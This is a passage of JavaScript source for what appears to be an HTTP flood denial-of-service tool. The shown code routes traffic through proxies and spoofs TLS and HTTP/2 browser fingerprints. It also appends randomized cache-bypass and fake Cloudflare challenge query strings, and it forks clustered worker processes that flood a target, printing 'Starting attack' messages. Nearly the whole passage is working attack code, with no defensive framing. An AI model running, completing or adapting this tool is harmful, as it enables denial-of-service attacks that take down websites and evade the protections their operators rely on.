        let proxyBuffer = '';
        proxySocket.on('data', (data) => {
            proxyBuffer += data.toString();
            if (proxyBuffer.includes('\r\n\r\n')) {
                const responseLine = proxyBuffer.split('\r\n')[0];
                if (responseLine.includes('200')) {
                    createTlsSocket(proxySocket, connectCallback);
                } else {
                    proxySocket.destroy();
                    setTimeout(go, 100);
                }
            }
        });
        
        proxySocket.on('error', () => {
            setTimeout(go, 100);
        });
        
        proxySocket.on('timeout', () => {
            proxySocket.destroy();
            setTimeout(go, 100);
        });
    } else {
        // Direct connection
        createTlsSocket(null, connectCallback);
    }
    
    function createTlsSocket(baseSocket, callback) {
        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            servername: url.hostname,
            ciphers: ja3Fingerprint.ciphers.join(':'),
            secureOptions: 
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_TLSv1 |
                crypto.constants.SSL_OP_NO_TLSv1_1,
            secure: true,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        };
        
        if (baseSocket) {
            tlsOptions.socket = baseSocket;
        } else {
            tlsOptions.host = url.hostname;
            tlsOptions.port = 443;
        }
        
        tlsSocket = tls.connect(tlsOptions, callback);
        
        tlsSocket.on('error', (err) => {
            if (debugMode) console.error('TLS error:', err.message);
            tlsSocket.destroy();
        });
        
        tlsSocket.on('timeout', () => {
            tlsSocket.destroy();
        });
    }
    
    function sendHttp1Request() {
        const method = enableCache ? getRandomMethod() : reqmethod;
        const path = enableCache ? url.pathname + generateCacheQuery() : 
                    (query ? handleQuery(query) : url.pathname);
        
        const authHeader = generateAuthorizationHeader(authValue);
        
        let request = `${method} ${path}${url.search} HTTP/1.1\r\n`;
        request += `Host: ${url.hostname}\r\n`;
        request += `User-Agent: ${fingerprint.navigator.userAgent}\r\n`;
        request += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n`;
        request += `Accept-Language: en-US,en;q=0.9\r\n`;
        request += `Accept-Encoding: gzip, deflate, br\r\n`;
        
        if (enableCache) {
            request += `Cache-Control: no-cache, no-store, must-revalidate\r\n`;
            request += `Pragma: no-cache\r\n`;
        }
        
        if (hcookie) {
            request += `Cookie: ${hcookie}\r\n`;
        }
        
        if (currentRefererValue) {
            request += `Referer: ${currentRefererValue}\r\n`;
        }
        
        if (authHeader) {
            request += `Authorization: ${authHeader}\r\n`;
        }
        
        if (customHeaders) {
            customHeaders.split('#').forEach(header => {
                const [name, value] = header.split(':').map(p => p?.trim());
                if (name && value) {
                    request += `${name}: ${value}\r\n`;
                }
            });
        }
        
        request += `Connection: keep-alive\r\n`;
        
        if (postdata && method === 'POST') {
            request += `Content-Type: application/x-www-form-urlencoded\r\n`;
            request += `Content-Length: ${Buffer.byteLength(postdata)}\r\n`;
            request += `\r\n${postdata}`;
        } else {
            request += `\r\n`;
        }
        
        tlsSocket.write(request, (err) => {
            if (err) {
                tlsSocket.destroy();
                return;
            }
            
            // Set up response handler
            let responseData = '';
            const responseHandler = (data) => {
                responseData += data.toString();
                
                // Look for status code
                if (responseData.includes('\r\n')) {
                    const firstLine = responseData.split('\r\n')[0];
                    const statusMatch = firstLine.match(/HTTP\/\d\.\d\s+(\d+)/);
                    if (statusMatch) {
                        const status = statusMatch[1];
                        if (!statuses[status]) statuses[status] = 0;
                        statuses[status]++;
                    }
                    
                    // Remove handler after getting response
                    tlsSocket.removeListener('data', responseHandler);
                }
            };
            
            tlsSocket.on('data', responseHandler);
            
            // Send next request
            setTimeout(() => {
                if (!tlsSocket.destroyed) {
                    sendHttp1Request();
                }
            }, isFull ? 100 : 1000 / ratelimit);
        });
    }
    
    function setupHttp2() {
        // Send HTTP/2 preface
        tlsSocket.write(PREFACE);
        
        // Send SETTINGS frame
        const settingsFrame = encodeFrame(0, 4, encodeSettings([
            [1, http2Fingerprint.HEADER_TABLE_SIZE],
            [2, http2Fingerprint.ENABLE_PUSH],
            [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
            [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
            [5, http2Fingerprint.MAX_FRAME_SIZE],
            [6, http2Fingerprint.MAX_HEADER_LIST_SIZE]
        ]));
        
        tlsSocket.write(settingsFrame);
        
        // Send WINDOW_UPDATE frame
        const windowUpdate = encodeFrame(0, 8, Buffer.from([0x00, 0x01, 0x00, 0x00]));
        tlsSocket.write(windowUpdate);
        
        let streamId = 1;
        let buffer = Buffer.alloc(0);
        
        // Handle incoming frames
        tlsSocket.on('data', (data) => {
            buffer = Buffer.concat([buffer, data]);
            
            while (buffer.length >= 9) {
                const frame = decodeFrame(buffer);
                if (!frame) break;
                
                buffer = buffer.subarray(9 + frame.length);
                
                if (frame.type === 4) { // SETTINGS
                    if (frame.flags === 0) { // Need ACK
                        tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 1)); // SETTINGS ACK
                    }
                } else if (frame.type === 1) { // HEADERS
                    try {
                        const decodedHeaders = hpack.decode(frame.payload);
                        for (const [name, value] of decodedHeaders) {
                            if (name === ':status') {
                                const status = value;
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                                break;
                            }
                        }
                    } catch (e) {
                        // Ignore decode errors
                    }
                } else if (frame.type === 0) { // DATA
                    // Ignore data frames
                } else if (frame.type === 7) { // GOAWAY
                    tlsSocket.destroy();
                    return;
                }
            }
        });
        
        // Start sending requests
        sendHttp2Requests();
        
        function sendHttp2Requests() {
            if (tlsSocket.destroyed) return;
            
            const requests = [];
            const localRatelimit = randrate ? getRandomInt(1, 90) : ratelimit;
            
            for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
                const method = enableCache ? getRandomMethod() : reqmethod;
                const path = enableCache ? url.pathname + generateCacheQuery() : 
                            (query ? handleQuery(query) : url.pathname);
                
                const headers = [
                    [':method', method],
                    [':authority', url.hostname],
                    [':scheme', 'https'],
                    [':path', path + (url.search || '')],
                    ['user-agent', fingerprint.navigator.userAgent],
                    ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
                    ['accept-language', 'en-US,en;q=0.9']
                ];
                
                if (hcookie) {
                    headers.push(['cookie', hcookie]);
                }
                
                if (currentRefererValue) {
                    headers.push(['referer', currentRefererValue]);
                }
                
                // Encode headers with HPACK
                const encodedHeaders = hpack.encode(headers);
                const headersFrame = encodeFrame(streamId, 1, encodedHeaders, 0x05); // END_HEADERS | END_STREAM
                
                requests.push(headersFrame);
                streamId += 2;
            }
            
            tlsSocket.write(Buffer.concat(requests), (err) => {
                if (err) {
                    tlsSocket.destroy();
                    return;
                }
                
                setTimeout(sendHttp2Requests, isFull ? 50 : 1000 / localRatelimit);
            });
        }
    }
}

function handleQuery(query) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString;
    } else if (query === '2') {
        return url.pathname + `?${randomPathSuffix}`;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 7);
    }
    return url.pathname;
}

function generateCacheQuery() {
    const cacheBypassQueries = [
        `?v=${Math.floor(Math.random() * 1000000)}`,
        `?_=${Date.now()}`,
        `?cachebypass=${randstr(8)}`,
        `?ts=${Date.now()}`,
        `?rnd=${randstr(6)}`
    ];
    return cacheBypassQueries[Math.floor(Math.random() * cacheBypassQueries.length)];
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 30) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster || cluster.isPrimary) {
    const workers = {};
    console.log(`Starting attack with ${threads} threads on ${target}`);
    console.log(`Duration: ${time} seconds`);
    console.log(`Rate limit: ${ratelimit} requests per second`);
    
    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        workers[worker.id] = worker;
    }
    
    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.id} died, restarting...`);
        cluster.fork();
    });
    
    if (debugMode) {
        setInterval(() => {
            let totalStatuses = {};
            
            for (const workerId in workers) {
                const worker = workers[workerId];
                if (worker.isConnected()) {
                    // In real implementation, workers would send status updates
                }
            }
            
            // Display stats
            console.clear();
            console.log(`[${chalk.blue.bold(new Date().toLocaleString('en-US'))}]`);
            console.log(`Target: ${target}`);
            console.log(`Threads: ${threads} | Duration: ${time}s`);
            
            const statusString = Object.entries(statuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            
            if (statusString) {
                console.log(`Status codes: [${statusString}]`);
            }
            
            console.log(`Active connections: ${rawConnections}`);
        }, 1000);
    }
    
    if (!connectFlag) {
        setTimeout(() => {
            console.log('Attack finished, exiting...');
            process.exit(0);
        }, time * 1000);
    }
} else {
    // Worker process
    if (connectFlag) {
        setInterval(go, Math.max(10, delay));
    } else {
        const interval = setInterval(() => {
            go();
        }, Math.max(10, 1000 / ratelimit));
        
        setTimeout(() => {
            clearInterval(interval);
            process.exit(0);
        }, time * 1000);
    }
    
    if (debugMode) {
        setInterval(() => {
            if (Object.keys(statuses).length > 0) {
                process.send(statuses);
                statuses = {};
            }
        }, 1000);
    }
}